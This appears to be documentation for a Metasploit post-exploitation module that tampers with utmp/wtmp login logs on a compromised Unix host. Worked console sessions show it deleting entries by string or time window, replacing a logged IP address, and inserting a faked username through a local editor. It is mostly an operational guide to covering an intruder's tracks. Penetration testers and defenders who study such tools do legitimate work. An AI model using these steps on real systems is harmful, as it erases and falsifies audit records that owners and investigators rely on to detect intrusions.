This module modifies utmp/wtmp logfiles. Entries can be removed based on a
search string or based on a given timeframe. Alternatively entries can be
changed for faked logs.

## Module Options


**FILES**

Define a special file to dump. If not defined a list of typical locations is
used

**LOCALEDIT**

Convert logfile into text format and launch an editor for editing it. By
default $EDITOR is used, 'vi' is fallback editor.
On some editors/settings you need to allow longer lines.
VI: ```set tw=0```

**REMOVETIME_START**

Select all entries after this time. Format is relativ flexible because it uses [Time.parse](http://ruby-doc.org/stdlib-2.2.3/libdoc/time/rdoc/Time.html#method-c-parse).

**REMOVETIME_STOP**

Select all entries before this time. Format is relativ flexible because it uses [Time.parse](http://ruby-doc.org/stdlib-2.2.3/libdoc/time/rdoc/Time.html#method-c-parse).


**REPLACE**

Replace string to be insered into log entry instead of the original string. This can be used for generating faked logs.

**STRING**

Search log entries for a special string (Regex) and remove them or replace with another string (if REPLACE is defined)


**USE_UPDATEDB**

Use or created (if not already created) updatedb for finding logfiles

**SESSION**

Which session to use, which can be viewed with `sessions -l`


## Scenario

### Original entry:

```
ut_type              [user process                            ]
ut_pid               [7751                                    ]
ut_line              [pts/0                                   ]
ut_id                [808416116                               ]
ut_user              [locxxxxx                                ]
ut_host              [dslb-xxx-xxx-xxx-xxx.pools.xxxxxxxx.net ]
ut_exit              [0                                       ]
ut_tv_sec            [2000-01-26 19:20:32 +0100               ]
ut_tv_usec           [0                                       ]
ut_session           [433397                                  ]
ut_addr_v6           [IPv4 127.127.127.127                    ]
unused               [                                        ]

```
### Changing the IP address:

```
msf post(clear_utmp) > set FILES /tmp/utmp
FILES => /tmp/utmp
msf post(clear_utmp) > set SESSION 1
SESSION => 1
msf post(clear_utmp) > set STRING 188.99.140.231
STRING => 188.99.140.231
msf post(clear_utmp) > set REPlACE 127.0.0.1
REPlACE => 127.0.0.1
msf post(clear_utmp) > run
[*] Post module execution completed

```

New entry:

```
ut_type              [user process                            ]
ut_pid               [7751                                    ]
ut_line              [pts/0                                   ]
ut_id                [808416116                               ]
ut_user              [locxxxxx                                ]
ut_host              [dslb-xxx-xxx-xxx-xxx.pools.xxxxxxxx.net ]
ut_exit              [0                                       ]
ut_tv_sec            [2000-01-26 19:20:32 +0100               ]
ut_tv_usec           [0                                       ]
ut_session           [433397                                  ]
ut_addr_v6           [IPv4 127.0.0.1                          ]
unused               [                                        ]

```


### Removing an entry

```
msf post(clear_utmp) > unset REPLACE
Unsetting REPLACE...
msf post(clear_utmp) > info

       Name: Utmp Logfiles Cleaner
     Module: post/unix/general/logs/clear_utmp
   Platform:
       Arch:
       Rank: Normal

Provided by:
  jot

Basic options:
  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  FILES             /tmp/utmp        no        A special log file
  LOCALEDIT         false            no        Edit text dump in local editor
  REMOVETIME_START                   no        Delete all entries between REMOVETIME_START andREMOVETIME_STOP 
  REMOVETIME_STOP                    no        Delete all entries between REMOVETIME_START andREMOVETIME_STOP 
  REPLACE                            no        A string for replacing the original string (if empty logentries will be removed)
  SESSION           1                yes       The session to run this module on.
  STRING            127.127.127.127  yes       A string to be removed from the log files
  USE_UPDATEDB      true             no        Use an updatedb database and search for filenames instead of full path

Description:
  Clear utmp log files

msf post(clear_utmp) > run
[*] Post module execution completed
msf post(clear_utmp) >
```
New entry:

*removed*

### Remove all entries within a timeframe

```
msf post(clear_utmp) > unset STRING
Unsetting STRING...
msf post(clear_utmp) > set REMOVETIME_START  2000-01-26 19:00:00
REMOVETIME_START => 2000-01-26 19:00:00
msf post(clear_utmp) > set REMOVETIME_STOP  2000-01-26 21:00:00
REMOVETIME_STOP => 2000-01-26 21:00:00
msf post(clear_utmp) > run
[*] Post module execution completed

```
New entry:

*removed*

### Manual edit a logfile
This converts all logentries into text format and lauches a text editor for
editing this

```
msf post(clear_utmp) > set VERBOSE true
VERBOSE => true
msf post(clear_utmp) > set LOCALEDIT true
LOCALEDIT => true
msf post(clear_utmp) > run

[*] base64 command already known: cat __READ_FILE__ 2>/dev/null|base64
[*] Max line length is 4096
[*] Maximal line length: 4096
[*] already found a command for echo: echo 'CONTENTS'|xxd -p -r
[*] Writing 3328 bytes in 4 chunks of 2010 bytes (bare_hex-encoded), using xxd
[*] Next chunk is 2010 bytes
[*] Next chunk is 2010 bytes
[*] Next chunk is 626 bytes
[*] Maximal line length: 4096
[*] already found a command for echo: echo 'CONTENTS'|xxd -p -r
[*] Writing 3072 bytes in 4 chunks of 2010 bytes (bare_hex-encoded), using xxd
[*] Next chunk is 2010 bytes
[*] Next chunk is 2010 bytes
[*] Next chunk is 114 bytes
[*] Post module execution completed
```

New entry:

```
ut_type              [user process                            ]
ut_pid               [7751                                    ]
ut_line              [pts/0                                   ]
ut_id                [808416116                               ]
ut_user              [faked_user_here                         ]
ut_host              [dslb-xxx-xxx-xxx-xxx.pools.xxxxxxxx.net ]
ut_exit              [0                                       ]
ut_tv_sec            [2000-01-26 19:20:32 +0100               ]
ut_tv_usec           [0                                       ]
ut_session           [433397                                  ]
ut_addr_v6           [none                                    ]
unused               [                                        ]

```

## Known bugs
Sometimes a file check fails (test -e; test -r and test -w). In this case this
module simply needs to be executed again.

Example:

```
msf post(clear_utmp) > run

[-] read permissions: true
[-] write permissions: true
[-] Need read and write permissions for /tmp/utmp for changing it! Cannot go on
[-] This could also be a known bug of this check. In this case you simply need to re-run this module

```
